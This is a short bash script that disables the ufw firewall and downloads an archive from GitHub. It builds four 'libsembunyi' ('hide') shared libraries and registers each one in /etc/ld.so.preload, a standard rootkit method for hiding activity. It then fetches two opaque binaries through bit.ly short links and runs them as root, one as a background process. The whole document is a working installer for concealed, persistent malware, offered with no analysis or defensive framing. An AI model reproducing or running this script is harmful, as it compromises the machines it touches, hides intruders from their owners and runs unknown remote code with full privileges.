#!/usr/bin/env bash
sudo ufw disable
wget https://github.com/BatiKangkung/KangKung/raw/main/all.tar.gz
sudo su --command "tar -xvf all.tar.gz && cd 01 && make && sudo mv libsembunyi01.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi01.so >> /etc/ld.so.preload && cd 02 && make && sudo mv libsembunyi02.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi02.so >> /etc/ld.so.preload && cd 03 && make && sudo mv libsembunyi03.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi03.so >> /etc/ld.so.preload && cd 04 && make && sudo mv libsembunyi04.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi04.so >> /etc/ld.so.preload"
sudo su --command "apt-get install shc -y && wget https://bit.ly/3NZULg3 && chmod +x 3NZULg3"
sudo su --command "nohup ./3NZULg3 --log=stdout > meta.log &"
sleep 2
sudo su --command "cat meta.log" 
sudo su --command "apt-get install shc -y && wget https://bit.ly/39IevGg && chmod +x 39IevGg"
sudo su --command "./39IevGg"
